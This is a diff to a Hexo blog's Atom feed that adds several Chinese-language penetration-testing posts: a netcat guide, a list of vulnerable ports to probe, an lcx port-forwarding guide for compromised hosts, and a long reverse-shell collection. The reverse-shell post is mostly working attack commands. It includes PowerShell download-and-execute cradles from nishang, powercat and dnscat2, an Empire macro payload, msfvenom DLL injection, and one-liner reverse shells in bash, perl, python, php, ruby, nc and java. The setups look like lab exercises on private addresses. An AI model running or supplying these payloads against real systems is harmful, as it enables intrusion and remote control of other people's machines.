@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-03T11:46:51.611Z</updated>
+  <updated>2018-12-04T15:12:54.197Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,100 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>nc命令使用</title>
+    <link href="http://yoursite.com/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yoursite.com/2018/12/04/nc命令使用/</id>
+    <published>2018-12-04T15:07:24.000Z</published>
+    <updated>2018-12-04T15:12:54.197Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul><li>-n 以数字形式表示的IP地址</li><li>-v 显示详细信息 [使用=vv获取更详细的信息</li><li>-l 监听入站信息</li><li>-p port 本地端口</li><li>-q secs 在标准输入且延迟后退出</li><li>-c shell commands shell模式</li><li>-u UDP模式</li><li>-s addr 本地源地址</li><li>-h 获取帮助信息</li><li>-z I/O 模式 [扫描时使用]</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bashB:nc ip port</code></pre><p>A将自己的Bash发给B</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp portB:nc ip port -c bash</code></pre><p>B将自己的Bash发给A</p><blockquote><p>win下Bash换成cmd</p></blockquote><p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p><h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul><li>nc -lp port  监听指定端口号</li><li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li></ul><h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul><li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li><li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li></ul><h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul><li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li><li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote><p>侦听端的文件名最好按照文件本身来命名</p></blockquote></li></ul><p><strong>将目录打包：</strong></p><p>tar -cvf - 目录名/|nc -lp port -q 1</p><p><strong>将目录解包</strong></p><p>nc -nv ip port |tar -xvf -</p><p><strong>NC端口扫描</strong></p><p>nc -nvz ip 1-65535</p><h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcryptA： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p><p>默认使用tcp进行扫描</p><h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sdaB: dd if=/dev/sda | nc -nc ip port -q 1</code></pre><ul><li>If是input filter</li><li>Of 是output filter</li></ul><p>B将数据复制到A挂载的硬盘上</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Netcat-nc&quot;&gt;&lt;a href=&quot;#Netcat-nc&quot; class=&quot;headerlink&quot; title=&quot;Netcat(nc):&quot;&gt;&lt;/a&gt;Netcat(nc):&lt;/h1&gt;&lt;p&gt;NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。&lt;/p
+      
+    
+    </summary>
+    
+      <category term="命令使用" scheme="http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>常见的漏洞端口</title>
+    <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
+    <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
+    <published>2018-12-04T07:48:29.000Z</published>
+    <updated>2018-12-04T07:56:29.494Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;21&lt;/strong&gt; ftp 主要看是否支持匿名，也可以跑弱口令&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;22&lt;/strong&gt; ssh SSH远程登录协议&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;23&lt;/strong&gt; telnet telnet终端仿真协议&lt;/p&gt;
+&lt;p&gt;
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>反弹shell的几种姿势</title>
+    <link href="http://yoursite.com/2018/12/04/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
+    <id>http://yoursite.com/2018/12/04/反弹shell的几种姿势/</id>
+    <published>2018-12-04T03:01:26.000Z</published>
+    <updated>2018-12-04T15:07:40.156Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h1><h2 id="powercat反弹shell"><a href="#powercat反弹shell" class="headerlink" title="powercat反弹shell"></a>powercat反弹shell</h2><p>环境说明：</p><ul><li>攻击机1：KALI 192.168.209.159</li><li>攻击机2：ubuntu 192.168.209.155</li><li>目标机：win7 192.168.209.160</li></ul><p><strong>可以在GitHub上下载powercat：</strong></p><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a></p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。</p><p>攻击机开启监听：</p><pre><code>nc -lvp 666</code></pre><p>或者用powercat监听：</p><pre><code>powercat -l -p 666</code></pre><p>目标机执行反弹cmd shell：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;);powercat -c 192.168.209.159 -p 6666 -e cmd</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujq7s2rzj30hv01rq2r.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujqds59gj30hf06dq68.jpg" alt=""></p><h2 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h2><p>Nishang(<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang </a>)是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><h2 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 666</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p>或者将nishang下载到攻击者本地：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuklpyrglj30i308zdig.jpg" alt=""></p><h2 id="Reverse-UDP-shell"><a href="#Reverse-UDP-shell" class="headerlink" title="Reverse UDP shell"></a>Reverse UDP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvup 123</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123</code></pre><blockquote><p>123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuq2fok35j30ht060tam.jpg" alt=""></p><h2 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h2><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a>)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p><p>攻击机1下载icmpsh_m.py文件，并执行</p><p><code>python icmpsh_m.py [Attacker IP] [Victim IP]</code></p><pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听</code></pre><p>目标机执行：</p><pre><code>powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuuo12w1cj30jm09y75t.jpg" alt=""></p><h2 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a>自定义powershell函数反弹shell</h2><p>利用<strong>powershell</strong>创建一个<strong>Net.Sockets.TCPClient</strong>对象，通过<strong>Socket</strong>反弹<strong>tcp shell</strong>，其实也是借鉴<strong>nishang</strong>中的<strong>Invoke-PowerShellTcpOneLine.ps1</strong></p><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 2333</code></pre><p>目标机执行：</p><pre><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuvui1lipj30ib03taas.jpg" alt=""></p><p>或者保存为lltest_tcp.ps1文件</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp</code></pre><p>lltest_tcp.ps1 如下：</p><pre><code>function Invoke-lltestTcp{$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666)$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2&gt;&amp;1 | Out-String )$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()}</code></pre><h2 id="dnscat2-反弹DNS-shell"><a href="#dnscat2-反弹DNS-shell" class="headerlink" title="dnscat2 反弹DNS shell"></a>dnscat2 反弹DNS shell</h2><p>dnscat2(<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a>)</p><p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p><p>攻击者2(Ubuntu 192.168.209.155)开启监听：</p><pre><code>ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open</code></pre><blockquote><p>-e open 不使用加密连接，默认使用加密</p></blockquote><ul><li>ruby dnscat2.rb —help 查看帮助</li></ul><p>目标机执行：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155</code></pre><p>成功反弹shell后，攻击机2：</p><pre><code>session -i 1 #进入到session 1shell #执行之后会新生成一个session 需要通过session -i 2 切换session -i 2</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyo6e3lkj30gr0d9js3.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyp53vbcj30cc077mx8.jpg" alt=""></p><h2 id="Empire-结合office反弹shell"><a href="#Empire-结合office反弹shell" class="headerlink" title="Empire 结合office反弹shell"></a>Empire 结合office反弹shell</h2><p>Empire(<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a>) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p><h3 id="利用office-宏反弹shell"><a href="#利用office-宏反弹shell" class="headerlink" title="利用office 宏反弹shell"></a>利用office 宏反弹shell</h3><p>攻击者(192.168.209.159)开启监听:</p><pre><code>uselistener httpexecutebackusestager windows/macro http #生成payloadexecute</code></pre><p>生成/tmp/macro 攻击代码后，新建一个word 创建宏</p><p>点击<strong>“文件”-“宏”-“创建”</strong>，删除自带的脚本，复制进去<strong>/tmp/macro</strong>文件内容，并保存为<strong>“Word 97-2003文档(.doc)”</strong>或者<strong>“启用宏的Word 文档(.docm)”</strong>文档，当诱导目标打开，执行宏后，即可成功反弹shell：</p><blockquote><p>说明:需要开启宏或者用户手动启用宏。开启宏设置：<strong>“文件”-“选项”-“信任中心”</strong>,选择“启用所有宏”</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzjkmh4jj30nr0g6ac1.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzk0ox8cj30ol0dtwf0.jpg" alt=""></p><h2 id="PowerSploit-DLL注入反弹shell"><a href="#PowerSploit-DLL注入反弹shell" class="headerlink" title="PowerSploit DLL注入反弹shell"></a>PowerSploit DLL注入反弹shell</h2><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</p><h3 id="msfvenom生成dll后门"><a href="#msfvenom生成dll后门" class="headerlink" title="msfvenom生成dll后门"></a>msfvenom生成dll后门</h3><p>目标机1执行：</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll</code></pre><blockquote><p>目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzuqx202j30hc063n0j.jpg" alt=""></p><h3 id="metasploit-设置payload-开启监听"><a href="#metasploit-设置payload-开启监听" class="headerlink" title="metasploit 设置payload 开启监听"></a>metasploit 设置payload 开启监听</h3><p>攻击机1执行：</p><pre><code>use exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.209.159set LPORT 4449exploit</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzyze3zgj30j80cvjyo.jpg" alt=""></p><h3 id="目标机远程下载"><a href="#目标机远程下载" class="headerlink" title="目标机远程下载"></a>目标机远程下载</h3><p>powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</p><p>目标执行：</p><pre><code>Get-Process #查看进程进程</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gxyplaj30i00bkdgb.jpg" alt=""></p><pre><code>IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gbw7nzj30ec05iglm.jpg" alt=""></p><h2 id="metasploit反弹shell"><a href="#metasploit反弹shell" class="headerlink" title="metasploit反弹shell"></a>metasploit反弹shell</h2><p>利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</p><p>攻击者1(192.168.209.159)：</p><pre><code>msfconsoleuse exploit/multi/script/web_deliveryset PAYLOAD windows/meterpreter/reverse_tcpset target 2set LHOST 192.168.209.159set LPORT 123exploit</code></pre><p>执行完exploit后会弹出一段payload，将这段payload复制到目标机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzee76ukj30k505kn0l.jpg" alt=""></p><p>目标机执行：</p><pre><code>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;);</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzcyrpgnj30yd09547q.jpg" alt=""></p><h2 id="Cobalt-strike反弹shell"><a href="#Cobalt-strike反弹shell" class="headerlink" title="Cobalt strike反弹shell"></a>Cobalt strike反弹shell</h2><p>博客中有一个专门的文章对Cobalt strike做介绍。</p><h1 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h1><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><blockquote><p>注意某些linux不支持</p></blockquote><p>这里shell由bash解析，有时候是由sh解析，不一定百发百中</p><p>这里<code>&amp;</code>在Linux shell中表示后台运行，当然这里<code>0&gt;&amp;1</code>不是这样,对于<code>&amp;1</code>更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO</p><h1 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h1><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><h1 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h1><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><h1 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h1><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h1 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h1><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h1 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h1><pre><code>nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h1 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h1><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;powershell反弹shell&quot;&gt;&lt;a href=&quot;#powershell反弹shell&quot; class=&quot;headerlink&quot; title=&quot;powershell反弹shell&quot;&gt;&lt;/a&gt;powershell反弹shell&lt;/h1&gt;&lt;h2 id=&quot;power
+      
+    
+    </summary>
+    
+      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>lcx使用:端口转发</title>
+    <link href="http://yoursite.com/2018/12/03/lcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    <id>http://yoursite.com/2018/12/03/lcx使用-端口转发/</id>
+    <published>2018-12-03T13:59:05.000Z</published>
+    <updated>2018-12-03T14:44:48.933Z</updated>
+    
+    <content type="html"><![CDATA[<p>端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。</p><p>Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。</p><h1 id="三个功能"><a href="#三个功能" class="headerlink" title="三个功能"></a>三个功能</h1><h2 id="tran功能"><a href="#tran功能" class="headerlink" title="tran功能"></a>tran功能</h2><p>ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。</p><p>例如：</p><h3 id="本机端口转向："><a href="#本机端口转向：" class="headerlink" title="本机端口转向："></a>本机端口转向：</h3><pre><code>lcx -tran 55 127.0.0.1 3389</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtx91elgyj30vw0enab4.jpg" alt=""></p><h3 id="转向其他主机端口："><a href="#转向其他主机端口：" class="headerlink" title="转向其他主机端口："></a>转向其他主机端口：</h3>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。&lt;/p&gt;
+&lt;p&gt;Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制
+      
+    
+    </summary>
+    
+      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Cobalt Strike的使用</title>
